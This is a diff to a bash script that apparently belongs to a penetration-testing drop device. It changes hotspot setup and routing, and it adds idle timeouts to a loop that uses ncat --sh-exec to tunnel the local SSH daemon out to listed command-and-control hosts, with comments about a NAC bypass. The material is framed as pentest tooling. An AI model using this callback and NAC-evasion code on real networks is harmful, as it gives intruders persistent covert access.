@@ -37,6 +37,8 @@ source "${_scriptdir}/config.sh"
 iprgx='((1?[0-9][0-9]?|25[0-5]|2[0-4][0-9])\.){3}(1?[0-9][0-9]?|25[0-5]|2[0-4][0-9])'
 
 start_hotspot() {
+    pkill hostapd
+    ip addr flush dev $WIRELESS_IFACE
     ip l set dev $WIRELESS_IFACE up
     ip a add $AP_IP dev $WIRELESS_IFACE
     udhcpd "$UDHCPD_DIR/$UDHCPD_FILE"
@@ -153,9 +155,9 @@ wake_iface() {
     local _wait=0
     local _icmp_dst='1.1.1.1'
     local _del_route=0
-    [[ -z "$(ip route show default via "$_gw" dev "$_iface")" ]] &&
+    [[ -z "$(ip route show "$_icmp_dst" via "$_gw" dev "$_iface")" ]] &&
     {
-        ip route add default via "$_gw" dev "$_iface"
+        ip route add "$_icmp_dst" dev "$_iface" proto static scope global via "$_gw"
         _del_route=1
     }
 
@@ -166,7 +168,7 @@ wake_iface() {
 
         ((${loss%%%*}<100)) &&
         {
-            ((_del_route)) && ip route del default via "$_gw" dev "$_iface"
+            ((_del_route)) && ip route del "$_icmp_dst" via "$_gw" dev "$_iface"
             return 0
         }
 
@@ -206,6 +208,9 @@ conf_iface() {
         dhclient "$_iface" #retry once on failure
     } || reboot
 
+    _gw=$(ip route show default dev $_iface | grep -oE "$iprgx")
+    ip route del default dev "$_iface"
+
     cat /dev/null >/etc/resolv.conf
 }
 
@@ -233,7 +238,6 @@ main() {
             # c&c traffic should use the designated interface, also whitelist c&c
             # traffic so the NAC bypass script doesn't lock the pentester out.
             
-            _gw=$(ip route show default dev $_iface | grep -oE "$iprgx")
             ip route del default dev $_iface
 
             for _host in "${HOMES[@]%:*}"
@@ -259,7 +263,7 @@ main() {
             _port="${_elem##*:}"
 
             [[ -n $(hping3 --syn -c 3 $_host -p $_port | grep -m 1 -io "flags=SA") ]] &&
-            ncat $_host $_port --wait 10 --sh-exec "ncat 127.0.0.1 $SSHD_PORT"
+            ncat $_host $_port --wait 10 --idle-timeout 15 --sh-exec "ncat 127.0.0.1 $SSHD_PORT --idle-timeout 15"
         done
 
         sleep 60
